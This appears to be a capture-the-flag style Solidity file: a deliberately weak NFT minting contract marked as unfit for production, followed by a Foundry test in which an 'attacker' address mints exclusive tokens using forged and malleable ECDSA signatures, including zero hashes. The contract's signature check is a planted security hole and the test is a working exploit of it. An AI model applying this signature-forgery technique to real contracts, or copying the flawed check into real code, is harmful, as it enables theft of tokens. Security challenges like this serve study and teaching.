//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/utils/Strings.sol";
import "@openzeppelin/contracts/access/Ownable2Step.sol";


// Do not use this code in production!
contract AlphaGoatClubPrototypeNFT is
  ERC721("AlphaGoatClubPrototypeNFT", "AGCNPFT"),
  Ownable2Step
{
  using Strings for uint256;
  using ECDSA for bytes32;

  mapping(bytes => bool) public usedSignatures;
  mapping(address => uint256) public commitBlock;
  string _tokenBaseURI =
    "https://storage.googleapis.com/alpha-goat-club/metadata/goat";

  uint256 constant BLOCK_COMMIT = 5;

  bool public publicSale;
  address public signer = 0x000000097C7e6f43bb3f225DB275B22C666402f1;

  modifier alreadyComitted() {
    uint256 _commitBlock = commitBlock[msg.sender];
    require(_commitBlock != 0, "NOT_COMMITED");
    require(
      block.number >= _commitBlock + BLOCK_COMMIT,
      "INSUFFICIENT_BLOCKS"
    );
    _;
  }

  constructor() {
    signer = msg.sender;
  }

  function changeSigner(address newAddress) public onlyOwner {
    signer = newAddress;
  }

  /// @notice less of a rug pull, more of a magic carpet ride
  function rugPullURI(string calldata newURI) public onlyOwner {
    _tokenBaseURI = newURI;
  }

  function togglePublicMint() public onlyOwner {
    publicSale = !publicSale;
  }

  /// @notice because bots like to frontrun free nft mints, you need to commit
  ///     and wait 5 blocks. Technically, bots can still copy your tx for
  ///     committing, but this is not a high value mint, so it's fine.
  function commit() external {
    require(commitBlock[msg.sender] == 0, "ALREADY_COMMITED");
    commitBlock[msg.sender] = block.number;
  }

  /// @notice public sale. Only works if public mint is open.
  /// @dev we can't stop you from using separate addresses to mint more NFTs
  ///    so please be a nice whitehat and only mint one.
  function mint(uint256 id) external alreadyComitted {
    require(publicSale, "NOT_PUBLIC_SALE");
    require(!_exists(id), "ALREADY_MINTED");
    commitBlock[msg.sender] = 0;
    _safeMint(msg.sender, id);
  }

  /// @notice only for exclusive buyers. Minting an NFT with id 5 or greater
  ///     won't give you a cool goat.
  /// @dev we can't stop you from using separate addresses to mint more NFTs
  ///    so please be nice whitehat and only mint one.
  function exclusiveBuy(
    uint256 id,
    bytes32 hash_,
    bytes memory signature
  ) external alreadyComitted {
    require(matchAddressSigner(hash_, signature), "DIRECT_MINT_DISALLOWED");
    require(usedSignatures[signature] == false, "SIGNATURE_ALREADY_USED");
    require(!_exists(id), "ALREADY_MINTED");
    usedSignatures[signature] = true;

    commitBlock[msg.sender] = 0;
    _safeMint(msg.sender, id);
  }

  function tokenURI(
    uint256 tokenId
  ) public view override returns (string memory) {
    require(
      _exists(tokenId),
      "ERC721Metadata: URI query for nonexistent token"
    );
    return
      string(
        abi.encodePacked(_tokenBaseURI, tokenId.toString(), ".json")
      );
  }

  function matchAddressSigner(
    bytes32 hash_,
    bytes memory signature
  ) private view returns (bool) {
    return signer == hash_.recover(signature);
  }
}
import "forge-std/Test.sol";

contract Problem230425Test is Test {
  address victim;
  address attacker;
  function setUp() public {
    vm.prank(address(0x000000097C7e6f43bb3f225DB275B22C666402f1));
    victim = address(new AlphaGoatClubPrototypeNFT());
    vm.deal(victim, 10000 ether);

    attacker = address(0x70997970C51812dc3A010C7d01b50e0d17dc79C8);
    vm.deal(attacker, 1 ether);
    vm.startPrank(attacker, attacker);
  }

  function commit(uint id, bytes32 hash, bytes1 v, bytes32 r, bytes32 s) internal {
    vm.roll(id*5+1);
    AlphaGoatClubPrototypeNFT(victim).commit();
    vm.roll(id*5+6);
    AlphaGoatClubPrototypeNFT(victim).exclusiveBuy(id, hash, abi.encodePacked(bytes32(r), bytes32(s), bytes1(v)));
  }

  function test_run() public {
    uint id = 0;
    commit(id++, 0x0422e4e07619a75d86a6e9bb82ac596c4bdecd3d61a00c2f4e3a88a3ce10acb7, 0x1c, 0x7ab49c7d72e945af66d3cd6461b099fdbcc682035bb9e887e1829e62008f3cd1, 0x188384bcbfd9d54890972e4e763511e387782d88b71d96b17f7b93cd62fc996c);
    commit(id++, 0x0000000000000000000000000000000000000000000000000000000000000000, 0x1c, 0x4dd42356847875c8ae9fb131edaf9b823f63d6c00b850d678285e4f8eb403b7b, 0x4dd42356847875c8ae9fb131edaf9b823f63d6c00b850d678285e4f8eb403b7b);
    commit(id++, 0x0000000000000000000000000000000000000000000000000000000000000000, 0x1b, 0xf4f206ba50268624c3669d195d70db512b203bc6c6c218e72f51429868577333, 0x0586fca2d7ecbced9e4cb17351479256c7c7508ff44343aa48408dfa33ef6707);
    commit(id++, 0x0000000000000000000000000000000000000000000000000000000000000000, 0x1b, 0xa19cbecf63166cf6755ef0a66d4170e765d0eb53912843ed4ea8170bdb187aaa, 0x35deea45210779a77c74fae2246b25a27745a3c685b816a46f8d5d03f3b2d38e);
    commit(id++, 0x0000000000000000000000000000000000000000000000000000000000000000, 0x1c, 0x34c4d25b59ef897d1fdf3280d86e12a99885aacf68e917a13f76a9e15bd6b7a2, 0x72cecb6929841da0b808335fc9e47b54f73603bf7d6a0a35900b84ce112572b8);
    commit(id++, 0x0000000000000000000000000000000000000000000000000000000000000000, 0x1c, 0xce8baf7a2ed10fd3fc7f10c427110b1831c1f41d7ebfab20bc07b566b1bf10ce, 0x5c82564ba2f69cc3ff4c9cf407d0356afc1690340934dbdf4bf86a63e6caaa03);
  }
}
